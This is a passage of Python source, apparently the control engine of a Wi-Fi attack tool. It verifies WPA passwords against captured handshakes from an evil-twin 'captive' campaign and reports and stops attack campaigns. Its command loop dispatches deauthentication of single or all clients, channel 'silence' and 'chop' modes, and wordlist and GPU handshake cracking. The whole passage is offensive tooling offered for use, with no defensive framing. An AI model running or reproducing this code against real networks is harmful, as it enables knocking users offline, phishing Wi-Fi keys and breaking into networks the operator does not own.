        target = str(bssid or "").lower()
        candidate = str(psk or "")
        ap = self.ap_for(target)
        if ap is not None:
            self.harvest(ap)
        wanted = {target}
        if self.campaign_kind == "captive" and self.campaign_twin_bssid:
            wanted.add(self.campaign_twin_bssid)
        compacts = {value.replace(":", "") for value in wanted}
        lines = []
        try:
            for path in captures_dir().glob("*.hc22000"):
                for _raw, line in read_hc22000(str(path)):
                    if getattr(line, "mac_ap", "") in compacts:
                        lines.append(line)
        except Exception as exc:  # noqa: BLE001
            emit("psk_verified", ok=False, bssid=target,
                 message=f"cannot read the capture: {type(exc).__name__}: {exc}")
            return
        if not lines:
            emit("psk_verified", ok=False, bssid=target,
                 message="no handshake captured yet: wait for a client, then verify")
            return
        verdict = psk_verdict([candidate], lines)
        if verdict:
            try:
                save_wpa_psk(getattr(ap, "ssid", None), target, candidate)
            except Exception:  # noqa: BLE001 - the verified key is still returned to the app
                log(traceback.format_exc())
            self.captive_psk = candidate
            emit("psk_verified", ok=True, bssid=target, psk=candidate)
            if (self.campaign is not None and not self.campaign.done
                    and self.campaign_kind == "captive"):
                self.campaign.request_stop()
        else:
            emit("psk_verified", ok=False, bssid=target,
                 message="password does not match the captured handshake")

    async def attack_status(self):
        """The campaign that is running right now, so a screen opened mid-attack can show it."""
        campaign = self.campaign
        if campaign is None or campaign.done:
            emit("attack_status", running=False)
            return
        ap = self.campaign_ap
        emit("attack_status", running=True, kind=self.campaign_kind,
             bssid=getattr(ap, "bssid", "") or "", ssid=getattr(ap, "ssid", None) or "",
             channel=getattr(ap, "channel", 0) or 0,
             progress=self.campaign_progress(campaign, self.campaign_kind))

    async def stop_attack(self):
        """Cooperative stop: the campaign's own teardown still runs, then attack_done lands."""
        campaign = self.campaign
        if campaign is None or campaign.done:
            emit("attack_stopped", kind=self.campaign_kind)
            return
        emit("attack_stopping", kind=self.campaign_kind)
        campaign.request_stop()

    async def stop(self):
        self.scanning = False
        self._cancel_attach_retry()
        self._stop_passive()
        if self.campaign is not None and not self.campaign.done:
            self.campaign.request_stop()
        if self.crack_job is not None and self.crack_tool is not None:
            try:
                from wifi4.models.jobs import JobAction

                self.crack_tool.apply(JobAction.STOP, self.crack_job)
            except Exception:  # noqa: BLE001
                pass
        if self.scan_task is not None and not self.scan_task.done():
            self.scan_task.cancel()
            try:
                await self.scan_task
            except (asyncio.CancelledError, Exception):  # noqa: BLE001
                pass
        try:
            if self.array is not None:
                await self.array.close()
        except Exception:  # noqa: BLE001
            pass
        emit("stopped")
        return True


async def main():
    configure_captures()
    try:
        log(f"opencl: {prepare_opencl()}")
    except Exception as exc:  # noqa: BLE001 - the GPU is optional, the runtime is not
        log(f"opencl: {type(exc).__name__}: {exc}")
    engine = Engine()
    # Announce readiness immediately: the app logs the whole line, so a broken runtime is
    # visible before the first command comes in.
    emit("ready", version=VERSION, native=bool(os.environ.get("PREFIX")),
         startup=True, runtime=runtime_info())
    loop = asyncio.get_running_loop()
    while True:
        line = await loop.run_in_executor(None, sys.stdin.readline)
        if not line:
            break
        line = line.strip()
        if not line:
            continue
        try:
            command = json.loads(line)
        except ValueError:
            emit("error", message=f"not JSON: {line[:120]}")
            continue
        name = command.get("cmd")
        try:
            if name == "ping":
                await engine.ping()
            elif name == "devices":
                await engine.devices()
            elif name == "usb_attach":
                await engine.usb_attach()
            elif name == "usb_lost":
                await engine.usb_lost()
            elif name == "status":
                await engine.status()
            elif name == "config":
                await engine.configure(command)
            elif name == "scan":
                await engine.scan(command.get("seconds"))
            elif name == "stop_scan":
                await engine.stop_scan()
            elif name == "targets":
                await engine.targets()
            elif name == "attack":
                await engine.attack(command.get("kind"), command.get("bssid"),
                                    command.get("options"))
            elif name == "verify_psk":
                await engine.verify_psk(command.get("bssid"), command.get("psk"))
            elif name == "deauth_client":
                await engine.deauth_client(command.get("bssid"), command.get("client"))
            elif name == "deauth_all":
                await engine.deauth_all(command.get("bssid"))
            elif name == "silence":
                await engine.silence(command.get("bssid"), bool(command.get("on")))
            elif name == "chop":
                await engine.chop(bool(command.get("on")))
            elif name == "attack_status":
                await engine.attack_status()
            elif name == "stop_attack":
                await engine.stop_attack()
            elif name == "captures":
                await engine.captures()
            elif name == "crack_tools":
                await engine.tool_list()
            elif name == "crack":
                await engine.crack(
                    command.get("capture"), command.get("tool") or "cpu_crack",
                    command.get("wordlists") or [],
                    command.get("default_passwords", True),
                    command.get("ssid_passwords", True),
                    command.get("probed_ssids", False),
                )
            elif name == "stop_crack":
                await engine.stop_crack()
            elif name == "stop":
                await engine.stop()
                return 0
            else:
                emit("error", message=f"unknown command: {name}")
        except Exception as exc:  # noqa: BLE001
            detail = traceback.format_exc()
            log(detail)
            emit("error", message=f"{type(exc).__name__}: {exc}", detail=detail.strip())
    await engine.stop()
    return 0


if __name__ == "__main__":
    try:
        sys.exit(asyncio.run(main()))
    except KeyboardInterrupt:
        sys.exit(0)
